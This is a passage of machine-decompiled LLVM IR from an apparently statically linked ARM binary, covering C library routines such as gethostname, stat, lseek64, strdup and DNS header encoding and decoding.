  %v0_19a5c = load i32, i32* %r3.global-to-local, align 4
  %v1_19a5c = load i32, i32* %r2.global-to-local, align 4
  %v2_19a5c = inttoptr i32 %v1_19a5c to i32*
  store i32 %v0_19a5c, i32* %v2_19a5c, align 4
  br label %dec_label_pc_19a74

dec_label_pc_19a64:                               ; preds = %dec_label_pc_19980
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_19818, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_19a74

dec_label_pc_19a74:                               ; preds = %bb37, %dec_label_pc_19a30, %dec_label_pc_19a64
  %v3_19a74 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_19a74, i32* @r0, align 4
  %v0_19a78 = call i32 @free()
  %v3_19a7c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_19a7c, i32* @r0, align 4
  %v0_19a80 = call i32 @free()
  store i32 %v0_19a80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19a8c

dec_label_pc_19a88:                               ; preds = %dec_label_pc_19860, %dec_label_pc_19884
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_19a8c

dec_label_pc_19a8c:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_1984c, %dec_label_pc_1982c, %dec_label_pc_19a74, %dec_label_pc_198e8, %dec_label_pc_19a88
  %v0_19a8c = load i32, i32* @r5, align 4
  store i32 %v0_19a8c, i32* %r0.global-to-local, align 4
  ret i32 %v0_19a8c

; uselistorder directives
  uselistorder i32 %v0_19a08, { 1, 0 }
  uselistorder i32 %v1_199e4, { 1, 0, 2 }
  uselistorder i32 %v1_199e0, { 1, 0 }
  uselistorder i32 %v0_199b0, { 1, 0, 2 }
  uselistorder i32 %v2_199a4, { 1, 0 }
  uselistorder i32 %v1_198a4, { 2, 1, 0 }
  uselistorder i32 %v1_19898, { 1, 0 }
  uselistorder i32 %v0_1986c, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_19818, { 2, 0, 1, 3 }
  uselistorder i32 %v0_197b8, { 1, 0 }
  uselistorder i32 %v0_197ac, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 19, 20, 3, 2, 5, 4, 6, 17, 18, 8, 7, 10, 9, 11, 13, 12, 15, 14, 16 }
  uselistorder i32 ()* @free, { 23, 22, 21, 20, 19, 18, 12, 11, 10, 9, 8, 7, 6, 5, 4, 24, 30, 29, 28, 17, 16, 15, 14, 1, 13, 27, 26, 25, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_19a8c, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_19a88, { 1, 0 }
  uselistorder label %dec_label_pc_19a74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19a30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19860, { 2, 0, 1 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19a9c = load i32, i32* @r7, align 4
  store i32 %v3_19a9c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19ac4, label %dec_label_pc_19ab4

dec_label_pc_19ab4:                               ; preds = %entry
  %v0_19ab4 = call i32 @__GI___errno_location()
  %v0_19ab8 = load i32, i32* %r7.global-to-local, align 4
  %v1_19ab8 = sub i32 0, %v0_19ab8
  %v2_19abc = inttoptr i32 %v0_19ab4 to i32*
  store i32 %v1_19ab8, i32* %v2_19abc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_19ac8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19ac4

dec_label_pc_19ac4:                               ; preds = %entry, %dec_label_pc_19ab4
  %v2_19ac8 = phi i32 [ %v3_19a9c, %entry ], [ %v2_19ac8.pre, %dec_label_pc_19ab4 ]
  %v0_19ac4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_19ab4 ]
  store i32 %v2_19ac8, i32* @r7, align 4
  ret i32 %v0_19ac4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19ac4, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_19adc = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_19aec = call i32 @uname(i32 %v2_19adc)
  %v7_19af0 = icmp eq i32 %v1_19aec, -1
  br i1 %v7_19af0, label %bb, label %dec_label_pc_19afc

bb:                                               ; preds = %entry
  store i32 %v1_19aec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19b38

dec_label_pc_19afc:                               ; preds = %entry
  %v2_19afc = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_19b04 = call i32 @strlen(i8* %tmp10)
  %v1_19b08 = add i32 %v3_19b04, 1
  %v1_19b0c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_19b08, %v1_19b0c
  br i1 %tmp, label %dec_label_pc_19b14, label %dec_label_pc_19b28

dec_label_pc_19b14:                               ; preds = %dec_label_pc_19afc
  %v0_19b14 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19b20 = inttoptr i32 %v0_19b14 to i32*
  store i32 22, i32* %v2_19b20, align 4
  %v0_19b38.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19b38

dec_label_pc_19b28:                               ; preds = %dec_label_pc_19afc
  %v0_19b28 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_19afc, i32* @r1, align 4
  %v2_19b30 = inttoptr i32 %v0_19b28 to i8*
  %v3_19b30 = call i32 @strcpy(i8* %v2_19b30, i32 %v2_19afc)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19b38

dec_label_pc_19b38:                               ; preds = %bb, %dec_label_pc_19b14, %dec_label_pc_19b28
  %v0_19b38 = phi i32 [ %v1_19aec, %bb ], [ %v0_19b38.pre, %dec_label_pc_19b14 ], [ 0, %dec_label_pc_19b28 ]
  ret i32 %v0_19b38

; uselistorder directives
  uselistorder i32 %v2_19afc, { 1, 0 }
  uselistorder i32 %v1_19aec, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i32 22, { 3, 17, 4, 5, 19, 6, 7, 8, 9, 15, 10, 11, 12, 16, 13, 0, 18, 14, 1, 2 }
  uselistorder label %dec_label_pc_19b38, { 2, 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19b80, label %dec_label_pc_19b6c

dec_label_pc_19b6c:                               ; preds = %entry
  %v0_19b6c = call i32 @__GI___errno_location()
  %v0_19b70 = load i32, i32* %r7.global-to-local, align 4
  %v1_19b70 = sub i32 0, %v0_19b70
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_19b78 = inttoptr i32 %v0_19b6c to i32*
  store i32 %v1_19b70, i32* %v2_19b78, align 4
  br label %dec_label_pc_19b90

dec_label_pc_19b80:                               ; preds = %entry
  %v2_19b80 = icmp eq i32 %arg1, 0
  br i1 %v2_19b80, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_19b80
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19b80, %bb
  call void @__pseudo_cond_branch(i1 %v2_19b80, i32 ptrtoint (i32* @global_var_17c94.912 to i32))
  br label %dec_label_pc_19b90

dec_label_pc_19b90:                               ; preds = %dec_label_pc_19b6c, %.thread
  %v0_19b90 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_19b90

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19b90, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19be0, label %dec_label_pc_19bcc

dec_label_pc_19bcc:                               ; preds = %entry
  %v0_19bcc = call i32 @__GI___errno_location()
  %v0_19bd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_19bd0 = sub i32 0, %v0_19bd0
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19bd8 = inttoptr i32 %v0_19bcc to i32*
  store i32 %v1_19bd0, i32* %v2_19bd8, align 4
  %v0_19be8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19be8

dec_label_pc_19be0:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_19be0 = icmp eq i32 %arg1, 0
  br i1 %v2_19be0, label %dec_label_pc_19bf4, label %dec_label_pc_19be8

dec_label_pc_19be8:                               ; preds = %dec_label_pc_19be0, %dec_label_pc_19bcc
  %v0_19be8 = phi i32 [ %arg1, %dec_label_pc_19be0 ], [ %v0_19be8.pre, %dec_label_pc_19bcc ]
  br label %dec_label_pc_19bf8

dec_label_pc_19bf4:                               ; preds = %dec_label_pc_19be0
  br label %dec_label_pc_19bf8

dec_label_pc_19bf8:                               ; preds = %dec_label_pc_19be8, %dec_label_pc_19bf4
  %v1_19c00 = phi i32 [ %v0_19be8, %dec_label_pc_19be8 ], [ %tmp8, %dec_label_pc_19bf4 ]
  ret i32 %v1_19c00

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_19bf8, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_19c10 = load i32, i32* @r0, align 4
  %v1_19c10 = load i32, i32* @r1, align 4
  %v2_19c10 = inttoptr i32 %v0_19c10 to i8*
  %v3_19c10 = call i32 @_memcpy(i8* %v2_19c10, i32 %v1_19c10)
  ret i32 %v3_19c10

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_19c20 = load i32, i32* @r4, align 4
  store i32 %v3_19c20, i32* %stack_var_-16, align 4
  %v9_19c20 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_19c28 = call i32 @strlen(i8* %arg1)
  %v1_19c2c = add i32 %v3_19c28, 1
  store i32 %v1_19c2c, i32* @r4, align 4
  %v1_19c34 = call i32 @malloc(i32 %v1_19c2c)
  store i32 %v1_19c34, i32* %r5.global-to-local, align 4
  %v2_19c38 = icmp eq i32 %v1_19c34, 0
  br i1 %v2_19c38, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_19c44 = xor i1 %v2_19c38, true
  call void @__pseudo_cond_branch(i1 %v1_19c44, i32 ptrtoint (i32* @global_var_11b90.839 to i32))
  %v0_19c48 = load i32, i32* %r5.global-to-local, align 4
  %v2_19c4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19c4c, i32* @r4, align 4
  store i32 %v9_19c20, i32* @r6, align 4
  ret i32 %v0_19c48

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 14, 13, 12, 6, 5, 15, 16, 22, 11, 10, 9, 1, 8, 7, 21, 20, 19, 18, 17, 4, 3, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_19c58 = load i32, i32* @lr, align 4
  store i32 %v0_19c58, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_19c64 = icmp sgt i32 %arg3, 11
  br i1 %v7_19c64, label %dec_label_pc_19c6c, label %dec_label_pc_19d38

dec_label_pc_19c6c:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_19c6c = add i32 %tmp, 1
  %v2_19c6c = inttoptr i32 %v1_19c6c to i8*
  %v3_19c6c = load i8, i8* %v2_19c6c, align 1
  store i8 %v3_19c6c, i8* %tmp16, align 1
  %v0_19c74 = load i32, i32* %ip.global-to-local, align 4
  %v1_19c74 = inttoptr i32 %v0_19c74 to i32*
  %v2_19c74 = load i32, i32* %v1_19c74, align 4
  %v1_19c78 = trunc i32 %v2_19c74 to i8
  %v4_19c78 = add i32 %arg2, 1
  %v5_19c78 = inttoptr i32 %v4_19c78 to i8*
  store i8 %v1_19c78, i8* %v5_19c78, align 1
  %v0_19c7c = load i32, i32* %ip.global-to-local, align 4
  %v1_19c7c = add i32 %v0_19c7c, 8
  %v2_19c7c = inttoptr i32 %v1_19c7c to i32*
  %v3_19c7c = load i32, i32* %v2_19c7c, align 4
  %v1_19c80 = add i32 %v0_19c7c, 20
  %v2_19c80 = inttoptr i32 %v1_19c80 to i32*
  %v3_19c80 = load i32, i32* %v2_19c80, align 4
  %v1_19c84 = add i32 %v0_19c7c, 4
  %v2_19c84 = inttoptr i32 %v1_19c84 to i32*
  %v3_19c84 = load i32, i32* %v2_19c84, align 4
  %v1_19c88 = add i32 %v0_19c7c, 12
  %v2_19c88 = inttoptr i32 %v1_19c88 to i32*
  %v3_19c88 = load i32, i32* %v2_19c88, align 4
  %v2_19c8c = icmp eq i32 %v3_19c80, 0
  br i1 %v2_19c8c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_19c6c
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_19c6c, %bb
  %v0_19c9c = phi i32 [ 0, %dec_label_pc_19c6c ], [ 1, %bb ]
  %v1_19c94 = urem i32 %v3_19c7c, 16
  %v2_19c98 = icmp eq i32 %v3_19c84, 0
  %v4_19c9c = mul nuw nsw i32 %v1_19c94, 8
  %v5_19c9c = or i32 %v0_19c9c, %v4_19c9c
  %v1_19ca0 = add i32 %v0_19c7c, 16
  %v2_19ca0 = inttoptr i32 %v1_19ca0 to i32*
  %v3_19ca0 = load i32, i32* %v2_19ca0, align 4
  %. = select i1 %v2_19c98, i32 0, i32 128
  %v2_19cac = icmp eq i32 %v3_19c88, 0
  %storemerge11 = select i1 %v2_19cac, i32 0, i32 4
  %v2_19cb8 = or i32 %v5_19c9c, %.
  %v2_19cbc = icmp eq i32 %v3_19ca0, 0
  %.26 = select i1 %v2_19cbc, i32 0, i32 2
  %v2_19cc8 = or i32 %v2_19cb8, %storemerge11
  %v2_19ccc = or i32 %v2_19cc8, %.26
  %v1_19cd0 = trunc i32 %v2_19ccc to i8
  %v2_19cd0 = load i32, i32* %lr.global-to-local, align 4
  %v3_19cd0 = add i32 %v2_19cd0, 2
  %v4_19cd0 = inttoptr i32 %v3_19cd0 to i8*
  store i8 %v1_19cd0, i8* %v4_19cd0, align 1
  %v0_19cd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_19cd4 = add i32 %v0_19cd4, 24
  %v1_19cd8 = inttoptr i32 %v1_19cd4 to i32*
  %v2_19cd8 = load i32, i32* %v1_19cd8, align 4
  %v3_19cd8 = add i32 %v0_19cd4, 28
  %v4_19cd8 = inttoptr i32 %v3_19cd8 to i32*
  %v5_19cd8 = load i32, i32* %v4_19cd8, align 4
  %v2_19cdc = icmp eq i32 %v2_19cd8, 0
  %v1_19ce0 = urem i32 %v5_19cd8, 16
  %v0_19cec = select i1 %v2_19cdc, i32 0, i32 128
  %v2_19cec = or i32 %v1_19ce0, %v0_19cec
  %v1_19cf0 = trunc i32 %v2_19cec to i8
  %v2_19cf0 = load i32, i32* %lr.global-to-local, align 4
  %v3_19cf0 = add i32 %v2_19cf0, 3
  %v4_19cf0 = inttoptr i32 %v3_19cf0 to i8*
  store i8 %v1_19cf0, i8* %v4_19cf0, align 1
  %v0_19cf4 = load i32, i32* %ip.global-to-local, align 4
  %v1_19cf4 = add i32 %v0_19cf4, 33
  %v2_19cf4 = inttoptr i32 %v1_19cf4 to i8*
  %v3_19cf4 = load i8, i8* %v2_19cf4, align 1
  %v2_19cf8 = load i32, i32* %lr.global-to-local, align 4
  %v3_19cf8 = add i32 %v2_19cf8, 4
  %v4_19cf8 = inttoptr i32 %v3_19cf8 to i8*
  store i8 %v3_19cf4, i8* %v4_19cf8, align 1
  %v0_19cfc = load i32, i32* %ip.global-to-local, align 4
  %v1_19cfc = add i32 %v0_19cfc, 32
  %v2_19cfc = inttoptr i32 %v1_19cfc to i32*
  %v3_19cfc = load i32, i32* %v2_19cfc, align 4
  %v1_19d00 = trunc i32 %v3_19cfc to i8
  %v2_19d00 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d00 = add i32 %v2_19d00, 5
  %v4_19d00 = inttoptr i32 %v3_19d00 to i8*
  store i8 %v1_19d00, i8* %v4_19d00, align 1
  %v0_19d04 = load i32, i32* %ip.global-to-local, align 4
  %v1_19d04 = add i32 %v0_19d04, 37
  %v2_19d04 = inttoptr i32 %v1_19d04 to i8*
  %v3_19d04 = load i8, i8* %v2_19d04, align 1
  %v2_19d08 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d08 = add i32 %v2_19d08, 6
  %v4_19d08 = inttoptr i32 %v3_19d08 to i8*
  store i8 %v3_19d04, i8* %v4_19d08, align 1
  %v0_19d0c = load i32, i32* %ip.global-to-local, align 4
  %v1_19d0c = add i32 %v0_19d0c, 36
  %v2_19d0c = inttoptr i32 %v1_19d0c to i32*
  %v3_19d0c = load i32, i32* %v2_19d0c, align 4
  %v1_19d10 = trunc i32 %v3_19d0c to i8
  %v2_19d10 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d10 = add i32 %v2_19d10, 7
  %v4_19d10 = inttoptr i32 %v3_19d10 to i8*
  store i8 %v1_19d10, i8* %v4_19d10, align 1
  %v0_19d14 = load i32, i32* %ip.global-to-local, align 4
  %v1_19d14 = add i32 %v0_19d14, 41
  %v2_19d14 = inttoptr i32 %v1_19d14 to i8*
  %v3_19d14 = load i8, i8* %v2_19d14, align 1
  %v2_19d18 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d18 = add i32 %v2_19d18, 8
  %v4_19d18 = inttoptr i32 %v3_19d18 to i8*
  store i8 %v3_19d14, i8* %v4_19d18, align 1
  %v0_19d1c = load i32, i32* %ip.global-to-local, align 4
  %v1_19d1c = add i32 %v0_19d1c, 40
  %v2_19d1c = inttoptr i32 %v1_19d1c to i32*
  %v3_19d1c = load i32, i32* %v2_19d1c, align 4
  %v1_19d20 = trunc i32 %v3_19d1c to i8
  %v2_19d20 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d20 = add i32 %v2_19d20, 9
  %v4_19d20 = inttoptr i32 %v3_19d20 to i8*
  store i8 %v1_19d20, i8* %v4_19d20, align 1
  %v0_19d24 = load i32, i32* %ip.global-to-local, align 4
  %v1_19d24 = add i32 %v0_19d24, 45
  %v2_19d24 = inttoptr i32 %v1_19d24 to i8*
  %v3_19d24 = load i8, i8* %v2_19d24, align 1
  %v2_19d28 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d28 = add i32 %v2_19d28, 10
  %v4_19d28 = inttoptr i32 %v3_19d28 to i8*
  store i8 %v3_19d24, i8* %v4_19d28, align 1
  %v0_19d2c = load i32, i32* %ip.global-to-local, align 4
  %v1_19d2c = add i32 %v0_19d2c, 44
  %v2_19d2c = inttoptr i32 %v1_19d2c to i32*
  %v3_19d2c = load i32, i32* %v2_19d2c, align 4
  %v1_19d30 = trunc i32 %v3_19d2c to i8
  %v2_19d30 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d30 = add i32 %v2_19d30, 11
  %v4_19d30 = inttoptr i32 %v3_19d30 to i8*
  store i8 %v1_19d30, i8* %v4_19d30, align 1
  %v2_19d38.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_19d38

dec_label_pc_19d38:                               ; preds = %entry, %bb17
  %v2_19d38 = phi i32 [ %v2_19d38.pre, %bb17 ], [ %v0_19c58, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_19d38, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_19c7c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 2, 0, 4, 1 }
  uselistorder i32 37, { 2, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19d38, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_19d40 = load i8, i8* %arg1, align 1
  %v4_19d40 = zext i8 %v3_19d40 to i32
  %v2_19d44 = add i32 %tmp, 1
  %v3_19d44 = inttoptr i32 %v2_19d44 to i8*
  %v4_19d44 = load i8, i8* %v3_19d44, align 1
  %v5_19d44 = zext i8 %v4_19d44 to i32
  %v4_19d48 = mul nuw nsw i32 %v4_19d40, 256
  %v5_19d48 = or i32 %v5_19d44, %v4_19d48
  %v2_19d4c = inttoptr i32 %arg2 to i32*
  store i32 %v5_19d48, i32* %v2_19d4c, align 4
  %v2_19d50 = add i32 %tmp, 2
  %v3_19d50 = inttoptr i32 %v2_19d50 to i8*
  %v4_19d50 = load i8, i8* %v3_19d50, align 1
  %tmp3 = icmp slt i8 %v4_19d50, 0
  %v3_19d54 = zext i1 %tmp3 to i32
  %v2_19d58 = add i32 %arg2, 4
  %v3_19d58 = inttoptr i32 %v2_19d58 to i32*
  store i32 %v3_19d54, i32* %v3_19d58, align 4
  %v4_19d5c = load i8, i8* %v3_19d50, align 1
  %div = udiv i8 %v4_19d5c, 8
  %tmp4 = urem i8 %div, 16
  %v1_19d64 = zext i8 %tmp4 to i32
  %v2_19d68 = add i32 %arg2, 8
  %v3_19d68 = inttoptr i32 %v2_19d68 to i32*
  store i32 %v1_19d64, i32* %v3_19d68, align 4
  %v4_19d6c = load i8, i8* %v3_19d50, align 1
  %div1 = udiv i8 %v4_19d6c, 4
  %tmp5 = urem i8 %div1, 2
  %v1_19d74 = zext i8 %tmp5 to i32
  %v2_19d78 = add i32 %arg2, 12
  %v3_19d78 = inttoptr i32 %v2_19d78 to i32*
  store i32 %v1_19d74, i32* %v3_19d78, align 4
  %v4_19d7c = load i8, i8* %v3_19d50, align 1
  %div2 = udiv i8 %v4_19d7c, 2
  %tmp6 = urem i8 %div2, 2
  %v1_19d84 = zext i8 %tmp6 to i32
  %v2_19d88 = add i32 %arg2, 16
  %v3_19d88 = inttoptr i32 %v2_19d88 to i32*
  store i32 %v1_19d84, i32* %v3_19d88, align 4
  %v4_19d8c = load i8, i8* %v3_19d50, align 1
  %tmp7 = urem i8 %v4_19d8c, 2
  %v1_19d90 = zext i8 %tmp7 to i32
  %v2_19d94 = add i32 %arg2, 20
  %v3_19d94 = inttoptr i32 %v2_19d94 to i32*
  store i32 %v1_19d90, i32* %v3_19d94, align 4
  %v2_19d98 = add i32 %tmp, 3
  %v3_19d98 = inttoptr i32 %v2_19d98 to i8*
  %v4_19d98 = load i8, i8* %v3_19d98, align 1
  %tmp8 = icmp slt i8 %v4_19d98, 0
  %v3_19d9c = zext i1 %tmp8 to i32
  %v2_19da0 = add i32 %arg2, 24
  %v3_19da0 = inttoptr i32 %v2_19da0 to i32*
  store i32 %v3_19d9c, i32* %v3_19da0, align 4
  %v4_19da4 = load i8, i8* %v3_19d98, align 1
  %tmp9 = urem i8 %v4_19da4, 16
  %v1_19da8 = zext i8 %tmp9 to i32
  %v2_19dac = add i32 %arg2, 28
  %v3_19dac = inttoptr i32 %v2_19dac to i32*
  store i32 %v1_19da8, i32* %v3_19dac, align 4
  %v2_19db0 = add i32 %tmp, 4
  %v3_19db0 = inttoptr i32 %v2_19db0 to i8*
  %v4_19db0 = load i8, i8* %v3_19db0, align 1
  %v5_19db0 = zext i8 %v4_19db0 to i32
  %v2_19db4 = add i32 %tmp, 5
  %v3_19db4 = inttoptr i32 %v2_19db4 to i8*
  %v4_19db4 = load i8, i8* %v3_19db4, align 1
  %v5_19db4 = zext i8 %v4_19db4 to i32
  %v4_19db8 = mul nuw nsw i32 %v5_19db0, 256
  %v5_19db8 = or i32 %v5_19db4, %v4_19db8
  %v2_19dbc = add i32 %arg2, 32
  %v3_19dbc = inttoptr i32 %v2_19dbc to i32*
  store i32 %v5_19db8, i32* %v3_19dbc, align 4
  %v2_19dc0 = add i32 %tmp, 6
  %v3_19dc0 = inttoptr i32 %v2_19dc0 to i8*
  %v4_19dc0 = load i8, i8* %v3_19dc0, align 1
  %v5_19dc0 = zext i8 %v4_19dc0 to i32
  %v2_19dc4 = add i32 %tmp, 7
  %v3_19dc4 = inttoptr i32 %v2_19dc4 to i8*
  %v4_19dc4 = load i8, i8* %v3_19dc4, align 1
  %v5_19dc4 = zext i8 %v4_19dc4 to i32
  %v4_19dc8 = mul nuw nsw i32 %v5_19dc0, 256
  %v5_19dc8 = or i32 %v5_19dc4, %v4_19dc8
  %v2_19dcc = add i32 %arg2, 36
  %v3_19dcc = inttoptr i32 %v2_19dcc to i32*
  store i32 %v5_19dc8, i32* %v3_19dcc, align 4
  %v2_19dd0 = add i32 %tmp, 8
  %v3_19dd0 = inttoptr i32 %v2_19dd0 to i8*
  %v4_19dd0 = load i8, i8* %v3_19dd0, align 1
  %v5_19dd0 = zext i8 %v4_19dd0 to i32
  %v2_19dd4 = add i32 %tmp, 9
  %v3_19dd4 = inttoptr i32 %v2_19dd4 to i8*
  %v4_19dd4 = load i8, i8* %v3_19dd4, align 1
  %v5_19dd4 = zext i8 %v4_19dd4 to i32
  %v4_19dd8 = mul nuw nsw i32 %v5_19dd0, 256
  %v5_19dd8 = or i32 %v5_19dd4, %v4_19dd8
  %v2_19ddc = add i32 %arg2, 40
  %v3_19ddc = inttoptr i32 %v2_19ddc to i32*
  store i32 %v5_19dd8, i32* %v3_19ddc, align 4
  %v2_19de0 = add i32 %tmp, 11
  %v3_19de0 = inttoptr i32 %v2_19de0 to i8*
  %v4_19de0 = load i8, i8* %v3_19de0, align 1
  %v5_19de0 = zext i8 %v4_19de0 to i32
  %v2_19de4 = add i32 %tmp, 10
  %v3_19de4 = inttoptr i32 %v2_19de4 to i8*
  %v4_19de4 = load i8, i8* %v3_19de4, align 1
  %v5_19de4 = zext i8 %v4_19de4 to i32
  %v4_19de8 = mul nuw nsw i32 %v5_19de4, 256
  %v5_19de8 = or i32 %v4_19de8, %v5_19de0
  %v2_19dec = add i32 %arg2, 44
  %v3_19dec = inttoptr i32 %v2_19dec to i32*
  store i32 %v5_19de8, i32* %v3_19dec, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 12, 13, 10, 11, 2, 14, 9, 37, 1, 3, 21, 22, 23, 24, 25, 26, 18, 19, 20, 15, 16, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 4, 17, 5, 6, 7, 8 }
  uselistorder i32 11, { 19, 20, 7, 8, 9, 10, 11, 21, 22, 12, 4, 5, 6, 13, 14, 15, 16, 17, 18, 0, 3, 2, 1 }
  uselistorder i32 40, { 12, 13, 16, 1, 6, 14, 17, 2, 15, 4, 3, 0, 7, 8, 9, 10, 11, 5 }
  uselistorder i32 36, { 28, 29, 32, 33, 34, 35, 9, 5, 8, 30, 10, 24, 11, 25, 12, 2, 6, 31, 13, 14, 15, 16, 0, 3, 17, 18, 4, 19, 20, 26, 27, 21, 22, 7, 1, 23 }
  uselistorder i32 7, { 21, 22, 16, 0, 11, 12, 1, 2, 23, 18, 19, 20, 3, 4, 5, 6, 17, 7, 13, 14, 8, 9, 15, 10 }
